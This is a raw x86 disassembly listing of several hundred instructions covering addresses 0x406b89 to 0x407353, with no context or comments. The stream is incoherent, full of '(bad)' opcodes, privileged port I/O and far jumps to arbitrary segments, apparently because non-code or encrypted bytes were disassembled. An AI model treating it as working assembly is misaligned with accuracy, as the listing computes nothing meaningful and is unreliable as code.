  406b89:	mov    edi,0x3dce00d0
  406b8e:	js     0x406b35
  406b90:	mov    es,eax
  406b92:	data16 xor al,0xfd
  406b95:	mov    edx,DWORD PTR [ebx]
  406b97:	adc    eax,0xf371d67b
  406b9c:	loopne 0x406bf0
  406b9e:	add    DWORD PTR [ebx+0x25],ebp
  406ba1:	xor    BYTE PTR [edx+0x64b74265],dl
  406ba7:	mov    ebp,0xc0848108
  406bac:	mov    ds:0xd33e215b,al
  406bb1:	aaa    
  406bb2:	mov    edi,0xf07b14f6
  406bb7:	(bad)  
  406bb8:	in     al,0x7b
  406bba:	rcr    DWORD PTR [ecx-0x4b7ec3a5],1
  406bc0:	in     al,0xf0
  406bc2:	and    BYTE PTR [eax+0x71006ab0],ah
  406bc8:	inc    eax
  406bc9:	mov    eax,edi
  406bcb:	lahf   
  406bcc:	jo     0x406c2d
  406bce:	mov    ebp,0x9bbf643b
  406bd3:	mov    eax,0xe57499c0
  406bd8:	gs ja  0x406bf6
  406bdb:	mov    al,ds:0xb4cb4966
  406be0:	pop    es
  406be1:	loop   0x406b73
  406be3:	jmp    0x4e7:0x2a0b560
  406bea:	xchg   esi,eax
  406beb:	pop    ebx
  406bec:	leave  
  406bed:	aad    0xc7
  406bef:	cmp    al,0x5a
  406bf1:	aam    0x6f
  406bf3:	popa   
  406bf4:	fistp  DWORD PTR [ecx+0x4e]
  406bf7:	push   edi
  406bf8:	mov    eax,0xd644f30d
  406bfd:	mov    dl,0xb9
  406bff:	je     0x406bc7
  406c01:	sub    al,0xc4
  406c03:	scas   eax,DWORD PTR es:[edi]
  406c04:	xchg   DWORD PTR [edx+0x56e48fa6],edx
  406c0a:	inc    eax
  406c0b:	push   eax
  406c0c:	sbb    ch,0x2d
  406c0f:	push   ss
  406c10:	aaa    
  406c11:	mov    WORD PTR ds:0xc2dda739,es
  406c17:	lahf   
  406c18:	mov    dh,dh
  406c1a:	push   esp
  406c1b:	dec    edi
  406c1c:	stc    
  406c1d:	je     0x406c23
  406c1f:	sbb    cl,BYTE PTR [eax]
  406c21:	pop    ss
  406c22:	sub    eax,0x6d95b1a5
  406c27:	or     eax,0x6856a915
  406c2c:	cmp    dl,BYTE PTR [edx-0x20140e2e]
  406c32:	das    
  406c33:	mov    es,WORD PTR [eax-0x3d62da9c]
  406c39:	mov    ds:0xaf4c9ef8,al
  406c3e:	dec    esi
  406c3f:	push   ds
  406c40:	call   0x3e35021f
  406c45:	dec    eax
  406c46:	popa   
  406c47:	dec    ebp
  406c48:	ins    BYTE PTR es:[edi],dx
  406c49:	push   ds
  406c4a:	adc    DWORD PTR [edx-0x44],esp
  406c4d:	out    0xa,al
  406c4f:	pop    ds
  406c50:	iret   
  406c51:	xor    BYTE PTR [eax-0x5ee25cbb],0xd0
  406c58:	push   ebp
  406c59:	dec    edi
  406c5a:	add    DWORD PTR [edi+0x312644fc],esi
  406c60:	gs cmp al,0x85
  406c63:	adc    DWORD PTR [edx+0x590e3660],0x7c
  406c6a:	aas    
  406c6b:	outs   dx,BYTE PTR ds:[esi]
  406c6c:	sbb    cl,BYTE PTR [esp+edx*2]
  406c6f:	stos   BYTE PTR es:[edi],al
  406c70:	(bad)  
  406c72:	loop   0x406cb8
  406c74:	std    
  406c75:	fisttp WORD PTR [edi]
  406c77:	out    0xdd,al
  406c79:	pop    ecx
  406c7a:	cmp    al,0xfb
  406c7c:	sub    esi,ebp
  406c7e:	and    BYTE PTR [ebx],ah
  406c80:	dec    esp
  406c81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c82:	cmp    al,0x11
  406c84:	ja     0x406c83
  406c86:	scas   al,BYTE PTR es:[edi]
  406c87:	jbe    0x406c29
  406c89:	popa   
  406c8a:	xor    edx,DWORD PTR [edx]
  406c8c:	mov    edi,0x9cb0dc56
  406c91:	dec    esi
  406c92:	jo     0x406c58
  406c94:	fsub   DWORD PTR [ebx-0x27fe5250]
  406c9a:	outs   dx,BYTE PTR ds:[esi]
  406c9b:	push   eax
  406c9c:	sahf   
  406c9d:	shr    ah,1
  406c9f:	cmp    bh,BYTE PTR [ebp+0x7467d793]
  406ca5:	ins    DWORD PTR es:[edi],dx
  406ca6:	push   ebp
  406ca7:	push   eax
  406ca8:	jne    0x406ca0
  406caa:	xor    BYTE PTR [ebp+0x5],0x75
  406cae:	mov    dh,0xe6
  406cb0:	sar    ah,0x22
  406cb3:	sahf   
  406cb4:	imul   edx,DWORD PTR [esi],0x39b68ce9
  406cba:	xchg   esp,eax
  406cbb:	dec    esp
  406cbc:	sub    eax,DWORD PTR [edi-0x59805aff]
  406cc2:	lea    eax,[ecx]
  406cc4:	iret   
  406cc5:	push   ds
  406cc6:	xchg   esp,eax
  406cc7:	xchg   edi,eax
  406cc8:	retf   0x6068
  406ccb:	in     eax,dx
  406ccc:	fdivr  DWORD PTR [ebp+0x23f681d2]
  406cd2:	pop    ebp
  406cd3:	jmp    0xe6a3:0x4340b91b
  406cda:	ss push esi
  406cdc:	shl    DWORD PTR [eax],cl
  406cde:	inc    ecx
  406cdf:	adc    bl,ch
  406ce1:	add    eax,0x99e8d107
  406ce6:	inc    al
  406ce8:	test   BYTE PTR [edi],ch
  406cea:	clc    
  406ceb:	shl    ebx,cl
  406ced:	pop    esi
  406cee:	pop    ecx
  406cef:	mov    gs,WORD PTR [edi]
  406cf1:	xchg   ecx,eax
  406cf2:	mov    ch,0xc5
  406cf5:	sbb    al,0x37
  406cf7:	sbb    eax,0x34c46c31
  406cfc:	sbb    BYTE PTR [edx-0x46],cl
  406cff:	int3   
  406d00:	pop    ss
  406d01:	mov    BYTE PTR [esi+0x20598bca],bh
  406d07:	scas   al,BYTE PTR es:[edi]
  406d08:	ds aam 0x79
  406d0b:	pop    es
  406d0c:	ret    0xf3d5
  406d0f:	ds inc edx
  406d11:	cli    
  406d12:	arpl   WORD PTR [ecx+0x55],dx
  406d15:	push   ebx
  406d16:	push   ds
  406d17:	adc    BYTE PTR [esi+0x7],ch
  406d1a:	pmulhuw mm4,mm3
  406d1d:	imul   ecx,ebx,0xb998dbf3
  406d23:	sub    ebx,DWORD PTR [ebp+0x4e7a127d]
  406d29:	fiadd  DWORD PTR ds:0x12b14d9b
  406d2f:	mov    eax,ds:0xdfa6904f
  406d34:	pop    ss
  406d35:	and    bh,BYTE PTR [ecx+0x6bc1c97]
  406d3b:	or     ch,BYTE PTR [esi-0x2c7ad07e]
  406d41:	dec    edi
  406d42:	add    eax,0x3e558b5
  406d47:	cwde   
  406d48:	sbb    dl,bh
  406d4a:	outs   dx,BYTE PTR ds:[esi]
  406d4b:	adc    DWORD PTR [edi+0x67],edx
  406d4e:	push   0x9
  406d50:	clc    
  406d51:	(bad)  
  406d52:	hlt    
  406d53:	push   ecx
  406d54:	idiv   BYTE PTR [ecx+0x14c4ae84]
  406d5a:	ficom  DWORD PTR [eax+0x499616de]
  406d60:	test   al,0xc9
  406d62:	and    ecx,DWORD PTR [esi+ecx*2+0x58]
  406d66:	mov    edx,0xe97c44ed
  406d6b:	push   ecx
  406d6c:	mov    ebx,0x7819be92
  406d71:	retf   0x4ff0
  406d74:	push   0x77611483
  406d79:	pop    ds
  406d7a:	adc    ch,dh
  406d7c:	shr    BYTE PTR ds:[edx-0x6f12eed3],0xf
  406d84:	xor    al,0x84
  406d86:	fucomp st(7)
  406d88:	cdq    
  406d89:	xlat   BYTE PTR ds:[ebx]
  406d8a:	fdiv   QWORD PTR [ecx+ebp*2]
  406d8d:	ins    BYTE PTR es:[edi],dx
  406d8e:	dec    ecx
  406d8f:	sbb    edx,edx
  406d91:	or     eax,0x3e8811a3
  406d96:	cmp    BYTE PTR [edi],0x73
  406d99:	xor    bh,BYTE PTR [ecx]
  406d9b:	mov    WORD PTR [edx-0x120c8dce],es
  406da1:	push   ebx
  406da2:	cmp    dh,BYTE PTR [ecx]
  406da4:	mov    bh,0xca
  406da6:	imul   eax,ebp,0xffffffc3
  406da9:	or     eax,edi
  406dab:	xor    BYTE PTR [eax],cl
  406dad:	mov    al,0xac
  406daf:	fs push 0xffffff81
  406db2:	sub    BYTE PTR [edx+0x1f],dh
  406db5:	push   esi
  406db6:	sub    bh,ch
  406db8:	lock jmp 0x406d55
  406dbb:	cmc    
  406dbc:	test   BYTE PTR [ecx],bl
  406dbe:	mov    BYTE PTR [eax-0x4f84bd24],cl
  406dc4:	and    esp,0xffffff94
  406dc7:	mov    cl,0xf7
  406dc9:	stc    
  406dca:	jg     0x406d77
  406dcc:	mov    ebx,0xc292d62c
  406dd1:	push   eax
  406dd2:	jle    0x406da7
  406dd4:	aad    0x2c
  406dd6:	imul   ebp,DWORD PTR [eax-0x5334f058],0x10
  406ddd:	out    dx,eax
  406dde:	jp     0x406db7
  406de0:	retf   
  406de1:	std    
  406de2:	repz xor al,0xb8
  406de5:	mov    cl,0xe1
  406de7:	int3   
  406de8:	stos   DWORD PTR es:[edi],eax
  406de9:	ja     0x406de1
  406deb:	push   ebx
  406dec:	fistp  QWORD PTR [ebx]
  406dee:	iret   
  406def:	jne    0x406e1f
  406df1:	mov    eax,ds:0x5cf99d01
  406df6:	dec    BYTE PTR [eax-0x57492c24]
  406dfc:	or     dl,BYTE PTR [edx]
  406dfe:	dec    ecx
  406dff:	xor    esi,DWORD PTR [ecx-0xbdeb7df]
  406e05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e06:	xchg   edi,eax
  406e07:	dec    edx
  406e08:	and    bl,ah
  406e0a:	ficom  WORD PTR [ecx+0x2beea8d9]
  406e10:	aaa    
  406e11:	fild   QWORD PTR [ebx+0xeb0f144]
  406e17:	sub    eax,esi
  406e19:	test   DWORD PTR [ebp+0x8],esi
  406e1c:	outs   dx,BYTE PTR ds:[esi]
  406e1d:	mov    ah,0x31
  406e1f:	cs sub eax,0x5bd0fd7c
  406e25:	repnz sbb ebx,DWORD PTR [ebp-0x51526fb7]
  406e2c:	adc    dh,dl
  406e2e:	push   cs
  406e2f:	pop    esp
  406e30:	jnp    0x406e24
  406e32:	fdiv   DWORD PTR [ecx]
  406e34:	rcr    BYTE PTR [ebx],0x6b
  406e37:	dec    ecx
  406e38:	lea    eax,[ebx+0x49]
  406e3b:	jo     0x406ddd
  406e3d:	aas    
  406e3e:	mov    bh,bl
  406e40:	jo     0x406ea1
  406e42:	fs sti 
  406e44:	mov    DWORD PTR [ecx+0x1536024f],esp
  406e4a:	pop    esi
  406e4b:	lea    ecx,[ebx-0x1]
  406e4e:	ret    0x3365
  406e51:	push   cs
  406e52:	icebp  
  406e53:	dec    edx
  406e54:	sbb    BYTE PTR [esi+0x488785ed],ch
  406e5a:	adc    eax,DWORD PTR [eax-0x584fd0aa]
  406e60:	mov    DWORD PTR [ebx],ebp
  406e62:	pop    esp
  406e63:	mov    al,ds:0x986b86cf
  406e68:	push   0xb5296759
  406e6d:	push   cs
  406e6e:	imul   edx,DWORD PTR [ebx+0xaec0741],0x32
  406e75:	and    bh,dl
  406e77:	push   ss
  406e78:	adc    bh,dl
  406e7a:	arpl   WORD PTR ds:0xbc80697f,di
  406e80:	call   DWORD PTR [ebp-0x47]
  406e83:	sub    al,0xb
  406e85:	jg     0x406e3f
  406e87:	test   eax,0xcb9f911
  406e8c:	outs   dx,BYTE PTR ds:[esi]
  406e8d:	out    dx,eax
  406e8e:	pop    eax
  406e8f:	popa   
  406e90:	mov    eax,db1
  406e93:	xchg   edx,eax
  406e94:	jmp    DWORD PTR [eax-0x3d64baf5]
  406e9a:	adc    DWORD PTR [edx-0x7d89e46d],edx
  406ea0:	adc    al,0xb5
  406ea2:	mov    ecx,0x2874a35e
  406ea7:	jmp    0xdd50f745
  406eac:	jne    0x406e86
  406eae:	repnz add al,0x42
  406eb1:	ins    DWORD PTR es:[edi],dx
  406eb2:	sub    BYTE PTR [edx],dh
  406eb4:	ret    0x3dd6
  406eb7:	enter  0xcaa3,0xcd
  406ebb:	ds out dx,eax
  406ebd:	not    DWORD PTR [ebx+0x6e429b97]
  406ec3:	stos   DWORD PTR es:[edi],eax
  406ec4:	and    al,0x42
  406ec6:	dec    esp
  406ec7:	mov    dh,0x4b
  406ec9:	pushf  
  406eca:	sub    eax,0x67a79e87
  406ecf:	xchg   DWORD PTR [esi+0x3683f996],ecx
  406ed5:	adc    eax,0x626aa926
  406eda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406edb:	call   DWORD PTR [ebx+eax*4+0x5d3540f2]
  406ee2:	and    BYTE PTR [ecx+0x4bd32284],0x4b
  406ee9:	cmp    DWORD PTR [ebp-0x4fd10f32],edx
  406eef:	mov    eax,ds:0xf785b6cb
  406ef4:	outs   dx,DWORD PTR ds:[esi]
  406ef5:	fcmovbe st,st(1)
  406ef7:	and    bh,cl
  406ef9:	mov    ah,0x79
  406efb:	mov    ebx,0x492a8d0b
  406f00:	mov    dl,0xa0
  406f02:	out    0x7f,al
  406f04:	(bad)  
  406f05:	pcmpeqb mm7,QWORD PTR [edx-0x39]
  406f09:	mov    edi,0x26d96a90
  406f0e:	sub    BYTE PTR [edx+ecx*2-0x6941bde1],ch
  406f15:	fadd   QWORD PTR [edi-0x13]
  406f18:	sti    
  406f19:	mov    eax,0x8f10d166
  406f1e:	inc    edx
  406f1f:	add    bh,BYTE PTR [ebx+eiz*8]
  406f22:	sbb    edi,eax
  406f24:	sbb    DWORD PTR [ecx-0x66],ebp
  406f27:	lahf   
  406f28:	mov    esp,0xfb88008b
  406f2d:	add    BYTE PTR [edi-0x56837ea9],dl
  406f33:	adc    esp,ebp
  406f35:	mov    cl,0xac
  406f37:	or     ah,BYTE PTR [ebp+0x54]
  406f3a:	add    bh,bl
  406f3c:	fldln2 
  406f3e:	sbb    eax,0x9c905221
  406f43:	hlt    
  406f44:	sahf   
  406f45:	not    DWORD PTR [edx]
  406f47:	sar    bl,0x8d
  406f4a:	mov    al,ds:0x279c2180
  406f4f:	mov    bh,0x2c
  406f51:	arpl   sp,dx
  406f53:	ins    DWORD PTR es:[edi],dx
  406f54:	adc    al,0x52
  406f56:	shl    DWORD PTR [edx-0x9cdd09],1
  406f5c:	clc    
  406f5d:	cwde   
  406f5e:	dec    edx
  406f5f:	cs sti 
  406f61:	mov    ds:0xb9a5665c,eax
  406f66:	out    0xf7,al
  406f68:	push   ebp
  406f69:	dec    ebx
  406f6a:	ins    BYTE PTR es:[edi],dx
  406f6b:	mov    esp,0x16b2a3d9
  406f70:	mov    edx,0xa2dae654
  406f75:	sti    
  406f76:	pop    esp
  406f77:	bound  esi,QWORD PTR [edx-0x1d]
  406f7a:	inc    eax
  406f7b:	jns    0x406f5a
  406f7d:	pop    es
  406f7e:	dec    ebp
  406f7f:	popa   
  406f80:	xchg   BYTE PTR [ecx],dh
  406f82:	sbb    eax,0x3c56572d
  406f87:	dec    eax
  406f88:	mov    ecx,0xf304442e
  406f8d:	jmp    0x5ae:0xec1323b
  406f94:	into   
  406f95:	xchg   esi,eax
  406f96:	jne    0x34659d57
  406f9c:	out    0x5d,eax
  406f9e:	ret    
  406f9f:	pusha  
  406fa0:	mov    ds:0x7eec3f92,eax
  406fa5:	mov    ebp,0xc0391d39
  406faa:	aad    0xb
  406fac:	xlat   BYTE PTR fs:[ebx]
  406fae:	pop    ebx
  406faf:	xchg   esp,eax
  406fb0:	inc    edi
  406fb1:	jecxz  0x40701e
  406fb3:	rcr    BYTE PTR [edx+0x49],0xfd
  406fb7:	ds int3 
  406fb9:	fidiv  DWORD PTR [edi+0x2a]
  406fbc:	out    dx,eax
  406fbd:	out    dx,eax
  406fbe:	dec    ecx
  406fbf:	daa    
  406fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fc1:	pusha  
  406fc2:	adc    al,0x9c
  406fc4:	dec    edx
  406fc5:	fnsave [ebx+eax*1]
  406fc8:	jne    0x406f99
  406fca:	cli    
  406fcb:	xchg   edx,eax
  406fcc:	ins    DWORD PTR es:[edi],dx
  406fcd:	les    esi,FWORD PTR [edi]
  406fcf:	clc    
  406fd0:	outs   dx,BYTE PTR ds:[esi]
  406fd1:	data16 je 0x406ff8
  406fd4:	mov    ebx,0x127891a1
  406fd9:	inc    ebx
  406fda:	jns    0x406fb7
  406fdc:	imul   ebp,ecx,0xffffff87
  406fdf:	lods   eax,DWORD PTR ds:[esi]
  406fe0:	mov    esi,0xe27ef1cf
  406fe5:	movq   mm6,mm3
  406fe8:	mov    ds:0x7c8e2971,al
  406fed:	mov    dh,0x54
  406fef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ff0:	xor    edx,ecx
  406ff2:	mov    dh,0x40
  406ff4:	mov    BYTE PTR [ecx+ecx*8],dl
  406ff7:	(bad)  
  406ff8:	adc    cl,BYTE PTR [edi-0x29]
  406ffb:	and    eax,0x9ab481e4
  407000:	std    
  407001:	repnz hlt 
  407003:	push   eax
  407004:	mov    ah,0x6d
  407006:	jp     0x406fce
  407008:	or     BYTE PTR [edi],bl
  40700a:	xchg   edi,eax
  40700b:	push   esp
  40700c:	out    dx,eax
  40700d:	retf   0xeabb
  407010:	not    ah
  407012:	test   al,0xaa
  407014:	jno    0x406f99
  407016:	pop    eax
  407017:	data16 jnp 0x406fdd
  40701a:	fcom   DWORD PTR [eax-0x52]
  40701d:	mov    dh,0x26
  40701f:	or     eax,0x11681146
  407024:	rol    DWORD PTR [edx+0x3ac3321f],1
  40702a:	jecxz  0x40709d
  40702c:	fild   DWORD PTR [ebx-0x3f]
  40702f:	cmp    ah,BYTE PTR [esi+0x69]
  407032:	call   0x8e8b:0x4d0a09c2
  407039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40703a:	(bad)
  40703e:	clc    
  40703f:	call   0x8c514944
  407044:	mov    bh,0x72
  407046:	stos   BYTE PTR es:[edi],al
  407047:	dec    DWORD PTR ds:0x12eae66a
  40704d:	imul   esp,edx,0xffffffa6
  407050:	and    ch,ah
  407052:	test   eax,0x72c630c2
  407057:	clc    
  407058:	jbe    0x406fff
  40705a:	jns    0x4070b7
  40705c:	mov    dh,0x18
  40705e:	sbb    DWORD PTR [ebp-0x4d9240c],esi
  407064:	push   0xc9a0396f
  407069:	sub    DWORD PTR [ebx],esp
  40706b:	inc    ebp
  40706c:	pushw  0xff99
  40706f:	or     al,BYTE PTR [esp+ebp*4-0x5e3b6faf]
  407076:	adc    DWORD PTR [edx-0x39],ebx
  407079:	pop    ebp
  40707a:	in     al,dx
  40707b:	jl     0x40707b
  40707d:	push   es
  40707e:	pushf  
  40707f:	in     al,dx
  407080:	mov    ds:0xd6741e1a,eax
  407085:	test   eax,0xac82c0f4
  40708a:	add    bh,bh
  40708c:	dec    ecx
  40708d:	icebp  
  40708e:	hlt    
  40708f:	or     al,0x9c
  407091:	mov    dl,0x2b
  407093:	int3   
  407094:	repz jae 0x4070c8
  407097:	push   eax
  407098:	fstp   TBYTE PTR [edi+0x41]
  40709b:	js     0x4070a9
  40709d:	mov    ds:0x6a23cb7b,eax
  4070a2:	stc    
  4070a3:	xchg   bh,dh
  4070a5:	and    dl,0x7b
  4070a8:	or     BYTE PTR [edi+0x6eb4d35a],ch
  4070ae:	aad    0x8c
  4070b0:	mov    ds:0x304570d4,eax
  4070b5:	cld    
  4070b6:	mov    edi,0x8d52f7c
  4070bb:	xchg   edx,eax
  4070bc:	popa   
  4070bd:	cs or  dh,ah
  4070c0:	push   cs
  4070c1:	daa    
  4070c2:	sbb    BYTE PTR [esi-0x1b],al
  4070c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070c6:	clc    
  4070c7:	pop    esi
  4070c8:	fadd   QWORD PTR [edi+0x4e]
  4070cb:	jmp    0x175d:0xef22c451
  4070d2:	push   ecx
  4070d3:	cwde   
  4070d4:	hlt    
  4070d5:	xchg   edx,eax
  4070d6:	cld    
  4070d7:	inc    ecx
  4070d8:	push   edx
  4070d9:	adc    ebp,DWORD PTR [ebx]
  4070db:	loope  0x4070c5
  4070dd:	xchg   ebp,eax
  4070de:	nop
  4070df:	jnp    0x407118
  4070e1:	or     bl,BYTE PTR [ebx+0x79]
  4070e4:	jge    0x40708e
  4070e6:	jmp    0x20cc:0xf5bf75c2
  4070ed:	fcmove st,st(4)
  4070ef:	jl     0x407128
  4070f1:	dec    edi
  4070f2:	data16 fstp st(0)
  4070f5:	sbb    ecx,DWORD PTR [edi+0x1]
  4070f8:	or     DWORD PTR [ebx],ebp
  4070fa:	xor    DWORD PTR [edx],ebp
  4070fc:	mov    eax,0x1d6a1530
  407101:	test   DWORD PTR [esp+esi*1-0x5f4a0854],ebp
  407108:	and    BYTE PTR [ecx],cl
  40710a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40710b:	test   eax,0x2745013d
  407110:	mov    ah,0x5
  407112:	mul    DWORD PTR [ebp-0xf]
  407115:	push   0x77
  407117:	mov    ds:0x7e190000,eax
  40711c:	dec    edi
  40711d:	sbb    dl,cl
  40711f:	push   edi
  407120:	in     eax,0x1d
  407122:	(bad)  
  407123:	mov    eax,DWORD PTR [ebx]
  407125:	div    BYTE PTR [ebp+0x30]
  407128:	mov    dl,0x45
  40712a:	fcmovnbe st,st(0)
  40712c:	sti    
  40712d:	sbb    ecx,edx
  40712f:	leave  
  407130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407131:	or     al,0xf2
  407133:	scas   al,BYTE PTR es:[edi]
  407134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407135:	sub    esp,DWORD PTR [ecx]
  407137:	mov    dh,0x68
  407139:	and    ecx,DWORD PTR [ebx+0x3d571a36]
  40713f:	xchg   ch,dh
  407141:	fisub  WORD PTR ds:0xf1117510
  407147:	jp     0x407147
  407149:	xchg   edi,eax
  40714a:	push   eax
  40714c:	cmc    
  40714d:	add    BYTE PTR [eax+0x65],al
  407150:	cld    
  407151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407152:	ins    BYTE PTR es:[edi],dx
  407153:	dec    eax
  407154:	or     al,0xaf
  407156:	int    0x63
  407158:	out    0x8b,eax
  40715a:	and    al,0x81
  40715c:	ins    DWORD PTR es:[edi],dx
  40715d:	mov    esi,0xba58610e
  407162:	jns    0x407131
  407164:	xor    eax,DWORD PTR [esi]
  407166:	and    BYTE PTR [esi+ecx*2-0x11],dl
  40716a:	inc    edx
  40716b:	push   esp
  40716d:	xor    BYTE PTR [edi+0x6b],dl
  407170:	jp     0x40715f
  407172:	jecxz  0x4071d8
  407174:	lods   eax,DWORD PTR ds:[esi]
  407175:	leave  
  407176:	lahf   
  407177:	push   edx
  407178:	adc    edx,0x33
  40717b:	inc    ebp
  40717c:	xor    bh,dh
  40717e:	xchg   ecx,eax
  40717f:	imul   eax,esi,0x3e
  407182:	jmp    0x47d8:0x7253265
  407189:	pushf  
  40718a:	(bad)  
  40718b:	push   esi
  40718c:	lds    ebx,FWORD PTR [esi]
  40718e:	and    edi,DWORD PTR [eax-0x79]
  407191:	xchg   ecx,eax
  407192:	mov    esi,0x710029bb
  407197:	in     al,0xd2
  407199:	xchg   ebp,eax
  40719a:	add    bl,dh
  40719c:	dec    edi
  40719d:	je     0x407126
  40719f:	mov    ah,0x53
  4071a1:	inc    ebp
  4071a2:	ds push edi
  4071a4:	lods   al,BYTE PTR ds:[esi]
  4071a5:	sbb    al,0xab
  4071a7:	aam    0x9d
  4071a9:	aas    
  4071aa:	xor    eax,ecx
  4071ac:	aad    0x81
  4071ae:	xchg   ebx,eax
  4071af:	test   DWORD PTR [eax+0x11829f43],esp
  4071b5:	lock mov esi,0x93dfc723
  4071bb:	aad    0x78
  4071bd:	scas   eax,DWORD PTR es:[edi]
  4071be:	or     ch,BYTE PTR [esp+edx*1]
  4071c1:	inc    esp
  4071c2:	add    DWORD PTR ds:[ecx],esi
  4071c5:	mov    al,0x13
  4071c7:	and    eax,0x8fc7564
  4071cc:	sbb    eax,esi
  4071ce:	cmp    ch,BYTE PTR [eax-0x31661bc5]
  4071d4:	lock imul ebx,DWORD PTR [eax-0x78],0x51
  4071d9:	pop    ebp
  4071da:	(bad)  
  4071db:	not    BYTE PTR [ebx+0x517ef06f]
  4071e1:	jecxz  0x4071d9
  4071e3:	pusha  
  4071e4:	out    0x71,al
  4071e6:	dec    ebx
  4071e7:	mov    dh,0x8a
  4071e9:	xchg   edx,eax
  4071ea:	cdq    
  4071eb:	mov    esp,0x961e382c
  4071f0:	outs   dx,DWORD PTR ds:[esi]
  4071f1:	jg     0x4071ef
  4071f3:	and    DWORD PTR [edi+0x1a],0xbecb36a9
  4071fa:	shl    DWORD PTR [ecx],cl
  4071fc:	push   0xfffffff8
  4071fe:	pop    esp
  4071ff:	nop
  407200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407201:	je     0x4071f8
  407203:	jmp    0x9bbdab7c
  407208:	mov    dh,0x25
  40720a:	fiadd  DWORD PTR [edx]
  40720c:	mov    dh,0x50
  40720e:	xor    DWORD PTR [esi+0x39],edx
  407211:	fisub  WORD PTR [esi]
  407213:	sbb    al,0x5a
  407215:	lds    esp,FWORD PTR [eax]
  407217:	arpl   WORD PTR [edi+0x5d],dx
  40721a:	adc    esi,0x1057884c
  407220:	stos   BYTE PTR es:[edi],al
  407221:	enter  0xe813,0x53
  407225:	pop    ds
  407226:	scas   al,BYTE PTR es:[edi]
  407227:	push   eax
  407228:	sub    cl,bh
  40722a:	sti    
  40722b:	pusha  
  40722c:	rol    BYTE PTR ds:0x2f3d429f,cl
  407232:	fs inc ebx
  407234:	loop   0x4071fd
  407236:	xchg   ebp,eax
  407237:	xchg   ecx,eax
  407238:	and    esi,DWORD PTR [edx-0x79026644]
  40723e:	mov    ch,0x19
  407240:	or     esi,DWORD PTR [edx]
  407242:	arpl   WORD PTR [esp+eiz*2-0x58],cx
  407246:	dec    edi
  407247:	xor    cl,ah
  407249:	ficomp DWORD PTR [esi-0x3d438d3]
  40724f:	mov    ecx,0x6b631316
  407254:	cs in  al,0xcf
  407257:	fiadd  WORD PTR [ecx+0x72cf1073]
  40725d:	(bad)  
  40725f:	pop    ecx
  407260:	mov    eax,ds:0xdc55caab
  407265:	in     eax,0xc8
  407267:	hlt    
  407268:	fadd   DWORD PTR [edx]
  40726a:	dec    ebx
  40726b:	xlat   BYTE PTR ds:[ebx]
  40726c:	push   ebp
  40726d:	fsubr  st,st(0)
  40726f:	int3   
  407270:	mov    eax,0x55660eef
  407275:	into   
  407276:	xchg   esi,eax
  407277:	push   ebx
  407278:	jne    0x4072e0
  40727a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40727b:	sub    dl,bh
  40727d:	stos   DWORD PTR es:[edi],eax
  40727e:	mov    ecx,0xe53c8c57
  407283:	push   esp
  407284:	cmp    eax,0xa33a8844
  407289:	les    ebp,FWORD PTR [esp]
  40728c:	clc    
  40728d:	fs dec esi
  40728f:	xlat   BYTE PTR ds:[ebx]
  407290:	leave  
  407291:	popa   
  407292:	adc    esp,DWORD PTR [edx+0x1c2de23c]
  407298:	adc    BYTE PTR [ecx-0x2c],cl
  40729b:	push   esi
  40729c:	xchg   esp,edx
  40729e:	sub    eax,0xc8819589
  4072a3:	imul   edi,DWORD PTR [ebx-0x677a0861],0x63d28ec5
  4072ad:	(bad)  
  4072ae:	xchg   esi,eax
  4072b0:	jecxz  0x407309
  4072b2:	xor    eax,0x5b73a7e4
  4072b7:	je     0x407331
  4072b9:	lea    edi,[ecx-0x656e0fe8]
  4072bf:	in     al,dx
  4072c0:	imul   ecx,esp,0xffffffc0
  4072c3:	cmc    
  4072c4:	or     BYTE PTR [esi],al
  4072c6:	or     al,0xd4
  4072c8:	jns    0x407266
  4072ca:	pushf  
  4072cb:	out    dx,eax
  4072cc:	fidiv  DWORD PTR [esi-0x14929c2e]
  4072d2:	and    DWORD PTR [ebp-0x27],ebp
  4072d5:	mov    esp,0x15afe675
  4072da:	inc    edx
  4072db:	call   0xfc6b7316
  4072e0:	jp     0x4072e9
  4072e2:	repz cmp al,0x1c
  4072e5:	dec    ebp
  4072e6:	fs jne 0x40729c
  4072e9:	xchg   ebx,eax
  4072ea:	sbb    BYTE PTR [eax+0xa],ch
  4072ed:	xchg   ebx,eax
  4072ee:	iret   
  4072ef:	es aad 0xf7
  4072f2:	mov    dl,0xc6
  4072f4:	inc    esp
  4072f5:	(bad)  
  4072f6:	addr16 pushf 
  4072f8:	cs aaa 
  4072fa:	push   cs
  4072fb:	or     eax,0xe4d0262d
  407300:	xchg   ecx,eax
  407301:	int3   
  407302:	push   esi
  407303:	add    eax,0x948debef
  407308:	enter  0x279f,0x3d
  40730c:	out    dx,eax
  40730d:	adc    dh,BYTE PTR [edi-0x2dc41bc7]
  407313:	(bad)  
  407314:	jmp    0x40736f
  407316:	shl    BYTE PTR [eax+0x6711ec00],1
  40731c:	xor    DWORD PTR [ecx],0xd
  40731f:	ret    0xa962
  407322:	ror    DWORD PTR [edx-0x13],0xe7
  407326:	inc    ecx
  407327:	adc    al,0xe5
  407329:	aam    0x58
  40732b:	fwait
  40732c:	pushf  
  40732d:	out    dx,al
  40732e:	fiadd  DWORD PTR [edx-0x6ea6154f]
  407334:	test   dl,0xfc
  407337:	mov    dh,0x4c
  407339:	fld1   
  40733b:	add    edx,DWORD PTR [esi]
  40733d:	push   esp
  40733e:	in     eax,dx
  40733f:	lods   eax,DWORD PTR ds:[esi]
  407340:	sbb    al,0xff
  407342:	fistp  QWORD PTR [edi]
  407344:	jae    0x40734f
  407346:	cmp    BYTE PTR [edi],0x6
  407349:	xchg   ebp,eax
  40734a:	push   esi
  40734b:	dec    edx
  40734c:	in     eax,0x3d
  40734e:	fist   WORD PTR [ebx+0x68]
  407351:	int    0x28
  407353:	aaa    
